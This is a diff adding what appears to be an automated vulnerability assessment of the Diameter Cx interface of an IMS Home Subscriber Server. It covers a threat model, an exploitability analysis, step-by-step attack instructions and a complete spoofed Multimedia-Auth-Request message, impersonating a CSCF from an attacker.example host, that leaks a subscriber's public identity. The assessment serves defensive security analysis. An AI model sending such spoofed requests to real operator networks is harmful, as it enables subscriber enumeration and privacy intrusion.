@@ -1,0 +1,96 @@
+## **Threat Model:**
+- **Attack Assumption:** A misconfigured HSS exposes its Cx Diameter interface to the Internet and accepts a direct Diameter connection from an attacker impersonating a trusted I-CSCF or S-CSCF. The HSS does not use TLS/IPsec or other effective peer authentication, and it processes a spoofed Multimedia-Auth-Request (MAR) received on that attacker-controlled connection.
+- **Attacker Capability:** The attacker actively sends one crafted MAR on its own Diameter connection to the HSS and passively receives only the resulting Multimedia-Auth-Answer (MAA) on that same connection. The attacker cannot observe or alter traffic between legitimate CSCFs and the HSS, but may know the target subscriber identifiers needed for the MAR, including a valid `Public-Identity`.
+
+## **Exploitability Analysis:**
+The target AVP is returned in the **Multimedia-Auth-Answer (MAA)**, which is the HSS-generated Answer to a **Multimedia-Auth-Request (MAR)** on the Cx interface, command code **286**, Cx/Dx application **16777216**, with 3GPP `Vendor-Id` **10415** in `Vendor-Specific-Application-Id`.
+
+Under the stated threat model, the spoofed MAR is processable because the HSS treats the attacker as a trusted Cx client. The protocol evidence shows that `Public-Identity` is part of the MAA AVP set and is included on the normal multimedia authentication procedure when the HSS successfully resolves the IMS identity context. There is **no dedicated request bitmask or disclosure flag** required to turn on this AVP. Inclusion is procedure-driven: a syntactically valid MAR carrying the subscriber context, notably `User-Name`, `Public-Identity`, and authentication request context such as `SIP-Number-Auth-Items`, can cause a successful MAA for a provisioned subscriber, with `Public-Identity` populated.
+
+The disclosure is real but limited in sensitivity. `Public-Identity` reveals an IMS public user identity such as a SIP URI or TEL URI, for example `sip:user@example.com` or `tel:+15551234567`. This does have **security/privacy value** because it enables:
+- subscriber identity correlation across IMS and SIP signaling;
+- confirmation that the HSS recognizes and provisions that public identity;
+- enumeration or mapping of private/user-login context to service-facing public identifiers.
+
+That said, this AVP does **not** disclose authentication vectors, location, service profile contents, or other high-value subscriber data by itself. Its value is identity disclosure and provisioning confirmation, which is meaningful enough under the decision rule because identity correlation is explicitly in scope.
+
+## **Attack Procedure:**
+1. Establish a Diameter connection directly to the victim HSS while impersonating a trusted I-CSCF or S-CSCF.
+2. Send a syntactically valid **Multimedia-Auth-Request (MAR)** for the target subscriber using:
+   - command code **286**;
+   - application id **16777216**;
+   - `Vendor-Specific-Application-Id` containing `Vendor-Id` **10415** and `Auth-Application-Id` **16777216**;
+   - base routing/session AVPs;
+   - identity context including `User-Name` and `Public-Identity`;
+   - `SIP-Number-Auth-Items` requesting at least one authentication item.
+3. Receive the corresponding **Multimedia-Auth-Answer (MAA)** from the HSS on that same connection.
+4. Success condition: the MAA indicates successful processing and contains a non-empty `Public-Identity` AVP populated with the subscriber's IMS public identity.
+
+## **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "command_code": 286,
+    "application_id": 16777216
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "cx.attacker.example;123456"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "icscf01.attacker.example"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss01.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "user@example.net"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:user@example.com"
+    },
+    {
+      "avp_name": "SIP-Number-Auth-Items",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Server-Name",
+      "avp_value": "scscf01.example.net"
+    }
+  ]
+}
+```
+
+## **Classification:**
+EXPLOITABLE
